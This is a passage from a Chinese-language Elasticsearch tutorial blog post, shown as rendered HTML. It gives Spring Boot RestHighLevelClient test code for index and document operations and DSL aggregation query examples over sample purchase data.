class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li>使用别名搜索</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /article/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;query&quot;: &#123;  </span><br><span class=\"line\">    \t&quot;match\\_all&quot;: &#123;&#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"5-从0开始，ES工业级Java-应用开发\"><a href=\"#5-从0开始，ES工业级Java-应用开发\" class=\"headerlink\" title=\"5 从0开始，ES工业级Java 应用开发\"></a>5 从0开始，ES工业级Java 应用开发</h1><h2 id=\"5-1-High-Level-Client基本用法\"><a href=\"#5-1-High-Level-Client基本用法\" class=\"headerlink\" title=\"5.1 High Level Client基本用法\"></a>5.1 High Level Client基本用法</h2><p>High Level Client客户端是构建于 Low Level Client之上的封装。</p>\n<p>类似于Hibernate和JDBC的关系。</p>\n<p>使用Spring Data ElasticSearch访问ElastiSearch,注意版本对应关系</p>\n<p><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/20.png\"><br>spring boot 2.6.1对应的ES版本<br><img src=\"/./2024/06/16/ES%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/21.png\"><br>High Level Client客户端测试案例</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">@SpringBootTest(webEnvironment = SpringBootTest.WebEnvironment.NONE)  </span><br><span class=\"line\">public class RestHighLevelClientTest  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //用来操作 Elasticsearch 服务器的一个客户端对象类  </span><br><span class=\"line\">    @Autowired  </span><br><span class=\"line\">    private RestHighLevelClient restHLClient;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(ints = &#123;1, 2, 3&#125;)  </span><br><span class=\"line\">    void testWithSimpleValueSource(int argument) &#123;  </span><br><span class=\"line\">        System.out.println(&quot;Parameterized test with value: &quot; + argument);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @Test  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    void testWithSneakyThrows() &#123;  </span><br><span class=\"line\">        throw new Exception(&quot;This exception is sneaky thrown!&quot;);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @CsvSource(&#123;&quot;1, 1, 2&quot;, &quot;2, 3, 5&quot;, &quot;3, 5, 8&quot;&#125;)  </span><br><span class=\"line\">    void testAddition(int a, int b, int result) &#123;  </span><br><span class=\"line\">        int sum = a + b;  </span><br><span class=\"line\">        Assertions.assertEquals(result, sum, &quot;Sum of &quot; + a + &quot; and &quot; + b + &quot; should be &quot; + result);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //创建三个索引库  </span><br><span class=\"line\">    @ParameterizedTest //参数测试  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ValueSource(strings = &#123;&quot;books&quot;, &quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class=\"line\">    public void testCreateIndex(String indexName)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //指定分词器创建索引库的json格式的数据，每一行用双引号包起来，然后里面的每个双引号前面用反斜杠\\\\转义  </span><br><span class=\"line\">        String json = &quot;&#123;&quot; +  </span><br><span class=\"line\">                &quot;\\\\&quot;settings\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;    \\\\&quot;analysis\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;      \\\\&quot;analyzer\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;        \\\\&quot;default\\\\&quot;: &#123;&quot; +  </span><br><span class=\"line\">                &quot;           \\\\&quot;tokenizer\\\\&quot;: \\\\&quot;ik\\_max\\_word\\\\&quot;&quot; +  </span><br><span class=\"line\">                &quot;        &#125;&quot; +  </span><br><span class=\"line\">                &quot;      &#125;&quot; +  </span><br><span class=\"line\">                &quot;    &#125;&quot; +  </span><br><span class=\"line\">                &quot;  &#125;&quot; +  </span><br><span class=\"line\">                &quot;&#125;&quot;;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        CreateIndexRequest request = new CreateIndexRequest(indexName)  </span><br><span class=\"line\">                //参数1：指定创建索引库时要传入的参数  ； 参数2：指定传入内容的类型  </span><br><span class=\"line\">                .source(json, XContentType.JSON);  </span><br><span class=\"line\">        //创建索引库后返回的响应类型--CreateIndexResponse  </span><br><span class=\"line\">        CreateIndexResponse resp = restHLClient.indices().create(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //获取Elasticsearch服务器的响应，就是响应索引库是否创建成功  </span><br><span class=\"line\">        System.err.println(resp.isAcknowledged());  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //删除索引库  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(strings = &#123;&quot;items&quot;, &quot;users&quot;&#125;)  </span><br><span class=\"line\">    public void testDeleteIndex(String indexName)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //删除索引的请求数据  </span><br><span class=\"line\">        DeleteIndexRequest request = new DeleteIndexRequest(indexName);  </span><br><span class=\"line\">        //客户端调用操作索引的方法，然后再调用删除的方法  </span><br><span class=\"line\">        AcknowledgedResponse resp = restHLClient.indices().delete(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        //查看删除后的响应  </span><br><span class=\"line\">        System.err.println(resp.isAcknowledged());  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //查询所有的索引库  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @Test //这个测试不需要参数，直接用这个@Test注解即可  </span><br><span class=\"line\">    public void testGetIndex()  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //参数 &quot;\\*&quot; ： 表示匹配所有的索引库  </span><br><span class=\"line\">        GetIndexRequest request = new GetIndexRequest(&quot;\\*&quot;);  </span><br><span class=\"line\">        //用rest客户端的方法来查询  </span><br><span class=\"line\">        GetIndexResponse resp = restHLClient.indices().get(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        //返回的索引库是一个String类型的数组  </span><br><span class=\"line\">        String\\[\\] indices = resp.getIndices();  </span><br><span class=\"line\">        //把数组转成字符串  </span><br><span class=\"line\">        String s = Arrays.toString(indices);  </span><br><span class=\"line\">        System.err.println(s);  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //往索引库添加文档  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    //测试参数有多个值 ，用这个注解  </span><br><span class=\"line\">    @CsvSource(&#123;  </span><br><span class=\"line\">            &quot;1,火影忍者,旋涡鸣人成长为第七代火影的故事,150&quot;,  </span><br><span class=\"line\">            &quot;2,家庭教师,废材纲成长为十代首领的热血事迹,200&quot;,  </span><br><span class=\"line\">            &quot;4,七龙珠Z,超级赛亚人贝吉塔来到地球后的热闹景象,400&quot;  </span><br><span class=\"line\">    &#125;)  </span><br><span class=\"line\">    public void testSaveDocument(Integer id, String title, String description, Double price)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明向 books 索引库添加文档  </span><br><span class=\"line\">        IndexRequest request = new IndexRequest(&quot;books&quot;)  </span><br><span class=\"line\">                .id(id + &quot;&quot;)  </span><br><span class=\"line\">                .source(  </span><br><span class=\"line\">                        &quot;title&quot;, title,  </span><br><span class=\"line\">                        &quot;description&quot;, description,  </span><br><span class=\"line\">                        &quot;price&quot;, price  </span><br><span class=\"line\">                );  </span><br><span class=\"line\">  </span><br><span class=\"line\">        IndexResponse resp = restHLClient.index(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据文档的id获取文档  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @ValueSource(ints = &#123;1, 3&#125;)  </span><br><span class=\"line\">    public void testGetDocumentById(Integer id)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明从 books 索引库获取文档  </span><br><span class=\"line\">        GetRequest request = new GetRequest(&quot;books&quot;)  </span><br><span class=\"line\">                //表明根据指定的文档的id获取文档  </span><br><span class=\"line\">                .id(id + &quot;&quot;);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        GetResponse resp = restHLClient.get(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据条件查询文档（普通关键字查询和通配符查询）  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @CsvSource(&#123;  </span><br><span class=\"line\">            &quot;description,热\\*&quot;,  </span><br><span class=\"line\">            &quot;description,成长&quot;  </span><br><span class=\"line\">    &#125;)  </span><br><span class=\"line\">    public void testSearchDocument(String field, String term)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        // 构建查询条件的类  </span><br><span class=\"line\">        SearchSourceBuilder builder = new SearchSourceBuilder();  </span><br><span class=\"line\">  </span><br><span class=\"line\">        // 通过 SearchSourceBuilder 可以用面向对象的方式来构建查询的 JSON 字符串  </span><br><span class=\"line\">        // SearchSourceBuilder 需要传入 QueryBuilders，而 QueryBuilders 用于构建 QueryBuilder  </span><br><span class=\"line\">        if (term != null &amp;&amp; term.contains(&quot;\\*&quot;))  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            //根据字段和通配符关键字查询  </span><br><span class=\"line\">            builder.query(QueryBuilders.wildcardQuery(field, term));  </span><br><span class=\"line\">        &#125; else  </span><br><span class=\"line\">        &#123;  </span><br><span class=\"line\">            //根据字段和普通关键字查询  </span><br><span class=\"line\">            builder.query(QueryBuilders.matchQuery(field,term));  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //表明从 books 索引库查询文档  </span><br><span class=\"line\">        SearchRequest request = new SearchRequest(&quot;books&quot;)  </span><br><span class=\"line\">                // 此处的 builder 参数用于构建查询语法  </span><br><span class=\"line\">                .source(builder);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        //客户端调用查询的方法 ， 参数1：查询条件语法  参数2：默认的请求选项，比如超时时间之类的  </span><br><span class=\"line\">        SearchResponse resp = restHLClient.search(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">    //根据 id 删除文档  </span><br><span class=\"line\">  </span><br><span class=\"line\">    @ParameterizedTest  </span><br><span class=\"line\">    @SneakyThrows  </span><br><span class=\"line\">    @ValueSource(ints = &#123;3,4&#125;)  </span><br><span class=\"line\">    public void testDeleteDocumentById(Integer id)  </span><br><span class=\"line\">    &#123;  </span><br><span class=\"line\">        //表明从 books 索引库删除文档  </span><br><span class=\"line\">        DeleteRequest request = new DeleteRequest(&quot;books&quot;)  </span><br><span class=\"line\">                //获取指定id的文档  </span><br><span class=\"line\">                .id(id+&quot;&quot;);  </span><br><span class=\"line\">        //rest客户端调用删除文档的方法  </span><br><span class=\"line\">        DeleteResponse resp = restHLClient.delete(request, RequestOptions.DEFAULT);  </span><br><span class=\"line\">        System.err.println(resp);  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<h2 id=\"5-2-聚合查询\"><a href=\"#5-2-聚合查询\" class=\"headerlink\" title=\"5.2 聚合查询\"></a>5.2 聚合查询</h2><h3 id=\"5-2-1-DSL聚合查询\"><a href=\"#5-2-1-DSL聚合查询\" class=\"headerlink\" title=\"5.2.1 DSL聚合查询\"></a>5.2.1 DSL聚合查询</h3><ol>\n<li>创建测试索引</li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">PUT /jh\\_test  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">\t&quot;settings&quot;: &#123;&#125;,  </span><br><span class=\"line\">\t&quot;mappings&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;properties&quot;: &#123;  </span><br><span class=\"line\">\t\t\t&quot;name&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;text&quot;,  </span><br><span class=\"line\">                &quot;fields&quot;: &#123;  </span><br><span class=\"line\">                    &quot;keyword&quot;: &#123;  </span><br><span class=\"line\">                        &quot;type&quot;: &quot;keyword&quot;,  </span><br><span class=\"line\">                        &quot;ignore\\_above&quot;: 256  </span><br><span class=\"line\">                    &#125;  </span><br><span class=\"line\">                &#125;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;sex&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;keyword&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">\t\t\t&quot;buyCount&quot;: &#123;  </span><br><span class=\"line\">\t\t\t\t&quot;type&quot;: &quot;long&quot;  </span><br><span class=\"line\">\t\t\t&#125;,  </span><br><span class=\"line\">            &quot;createMonth&quot;:&#123;  </span><br><span class=\"line\">                &quot;type&quot;:&quot;keyword&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">\t\t&#125;  </span><br><span class=\"line\">\t&#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>其中字段的含义为：name：姓名、buyCount：购买数量，sex：性别，createMonth：创建月 添加测试数据</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">POST /jh\\_test/\\_doc/1  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/2  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:5,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/3  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;小卷&quot;,&quot;buyCount&quot;:18,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/4  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;小明&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;女&quot;,&quot;createMonth&quot;:&quot;2021-01&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/5  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/6  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:8,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/7  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/8  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;诸葛亮&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-02&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/9  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;黄忠&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/10  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李白&quot;,&quot;buyCount&quot;:1,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/11  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;赵四&quot;,&quot;buyCount&quot;:3,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/12  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;张三&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-03&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/13  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:6,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/14  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:9,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/15  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;李四&quot;,&quot;buyCount&quot;:4,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">POST /jh\\_test/\\_doc/16  </span><br><span class=\"line\">&#123;&quot;name&quot;:&quot;王五&quot;,&quot;buyCount&quot;:2,&quot;sex&quot;:&quot;男&quot;,&quot;createMonth&quot;:&quot;2021-04&quot;&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>聚合查询语法：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&quot;aggs&quot; : &#123;  </span><br><span class=\"line\">    &quot;&lt;aggregation\\_name&gt;&quot; : &#123;                                 &lt;!--聚合名称 --&gt;  </span><br><span class=\"line\">        &quot;&lt;aggregation\\_type&gt;&quot; : &#123;                             &lt;!--聚合类型 --&gt;  </span><br><span class=\"line\">            &lt;aggregation\\_body&gt;                               &lt;!--聚合具体字段 --&gt;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">        \\[,&quot;meta&quot; : &#123;  \\[&lt;meta\\_data\\_body&gt;\\] &#125; \\]?                &lt;!--元信息 --&gt;  </span><br><span class=\"line\">        \\[,&quot;aggs&quot; : &#123; \\[&lt;sub\\_aggregation&gt;\\]+ &#125; \\]?       &lt;!--子聚合 --&gt;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol>\n<li><strong>查询 buyCount 的总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">GET /jh\\_test/\\_search  </span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountSum&quot;:&#123;  </span><br><span class=\"line\">      &quot;sum&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"2\">\n<li><strong>查询 2021-02 月 buyCount 的总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-02&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountSum&quot;:&#123;  </span><br><span class=\"line\">      &quot;sum&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"3\">\n<li><strong>查询 2021-03 月 buyCount 的最大值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMax&quot;:&#123;  </span><br><span class=\"line\">      &quot;max&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"4\">\n<li><strong>查询 2021-03 月 buyCount 的最小值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMin&quot;:&#123;  </span><br><span class=\"line\">      &quot;min&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"5\">\n<li><strong>同时查询 2021-03 月 buyCount 的最大值和最小值：</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">   &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-03&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;buyCountMax&quot;:&#123;  </span><br><span class=\"line\">      &quot;max&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;,  </span><br><span class=\"line\">     &quot;buyCountMin&quot;:&#123;  </span><br><span class=\"line\">      &quot;min&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;buyCount&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"6\">\n<li><strong>查询所有 name 的去重后的数量</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;distinctName&quot;:&#123;  </span><br><span class=\"line\">      &quot;cardinality&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"7\">\n<li><strong>查询 2021-04 月 name 的去重后的数量</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;query&quot;: &#123;  </span><br><span class=\"line\">\t\t&quot;term&quot;: &#123;   </span><br><span class=\"line\">            &quot;createMonth&quot;: &quot;2021-04&quot;   </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">\t&#125;,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    &quot;distinctName&quot;:&#123;  </span><br><span class=\"line\">      &quot;cardinality&quot;: &#123;  </span><br><span class=\"line\">        &quot;field&quot;: &quot;name.keyword&quot;  </span><br><span class=\"line\">      &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">  &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"8\">\n<li><strong>查询 BuyCount 的平均值</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">    &quot;size&quot;:&quot;0&quot;,  </span><br><span class=\"line\">    &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">        &quot;buyCountAvg&quot;:&#123;  </span><br><span class=\"line\">            &quot;avg&quot;:&#123;  </span><br><span class=\"line\">                &quot;field&quot;:&quot;buyCount&quot;  </span><br><span class=\"line\">            &#125;  </span><br><span class=\"line\">        &#125;  </span><br><span class=\"line\">    &#125;  </span><br><span class=\"line\">&#125;  </span><br><span class=\"line\">  </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<ol start=\"9\">\n<li><strong>一次查询 总数，最大值，最小值，平均值，总和</strong></li>\n</ol>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">&#123;  </span><br><span class=\"line\">  &quot;size&quot;:0,  </span><br><span class=\"line\">  &quot;aggs&quot;:&#123;  </span><br><span class=\"line\">    